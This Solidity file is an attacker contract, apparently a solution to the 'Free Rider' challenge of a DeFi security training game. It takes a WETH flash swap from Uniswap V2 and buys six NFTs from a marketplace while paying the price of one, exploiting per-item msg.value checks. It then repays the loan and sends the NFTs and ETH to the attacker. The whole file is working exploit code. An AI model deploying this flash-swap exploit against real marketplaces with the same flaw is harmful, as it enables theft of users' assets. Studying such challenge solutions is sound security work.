// SPDX-License-Identifier: Undefined

pragma solidity ^0.8.0;

import "../interfaces/IUniswapV2Callee.sol";
import "../interfaces/IUniswapV2Pair.sol";
import "../interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackerContract is IUniswapV2Callee, IERC721Receiver {
    address public dvt_weth_pair;
    address public weth;
    address public marketplace;
    address public nft_buyer;
    address ATTACKER;
    address nft;
    address partner_contract;
    uint256[] ids = [0, 1, 2, 3, 4, 5];
    event BalanceFlashSwap(uint256);
    event FeeValue(uint256);
    event AmountToRepay(uint256);

    constructor(
        address _pair,
        address _weth,
        address _marketplace,
        address _nft
    ) payable {
        dvt_weth_pair = _pair;
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        ATTACKER = msg.sender;
    }

    function setNFTBuyer(address _nft_buyer) public {
        require(msg.sender == ATTACKER, "Forbidden");
        nft_buyer = _nft_buyer;
    }

    function attack() public payable {
        require(msg.sender == ATTACKER, "Forbidden");
        require(nft_buyer != address(0), "NFT Buyer not set");
        uint256 amount = 15 ether;
        _flashSwap(amount);
    }

    // Sources:
    // https://dev.to/uv-labs/executing-flash-swaps-on-uniswap-6ch
    // https://www.youtube.com/watch?v=MxTgk-kvtRM

    function _flashSwap(uint256 _weth_amount) internal {
        address token0 = IUniswapV2Pair(dvt_weth_pair).token0();
        address token1 = IUniswapV2Pair(dvt_weth_pair).token1();

        require(token0 != address(0));
        require(token1 != address(0));

        uint256 amount0Out = (weth == token0 ? _weth_amount : 0);
        uint256 amount1Out = (weth == token1 ? _weth_amount : 0);

        require(amount0Out != 0 || amount1Out != 0);

        bytes memory data = abi.encode(weth, _weth_amount);

        IUniswapV2Pair(dvt_weth_pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            data
        );
    }

    // Sources:
    // https://dev.to/uv-labs/executing-flash-swaps-on-uniswap-6ch
    // https://www.youtube.com/watch?v=MxTgk-kvtRM

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        // call uniswapv2factory to getpair
        address pair = dvt_weth_pair;
        require(msg.sender == pair, "!pair");
        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );
        IWETH(weth).withdraw(amount);
        IFreeRiderNFTMarketplace(marketplace).buyMany{value: 15 ether}(ids);
        IERC721(nft).setApprovalForAll(ATTACKER, true);

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;
        IWETH(weth).deposit{value: amountToRepay}();
        IWETH(tokenBorrow).transfer(pair, amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function transferNFTs() public {
        require(msg.sender == ATTACKER, "FORBIDDEN");

        for (uint8 id = 0; id < 6; id++) {
            IERC721(nft).safeTransferFrom(address(this), nft_buyer, id);
        }
    }

    receive() external payable {}

    function withdraw() public payable {
        require(msg.sender == ATTACKER, "FORBIDDEN");
        payable(msg.sender).transfer(address(this).balance);
    }
}
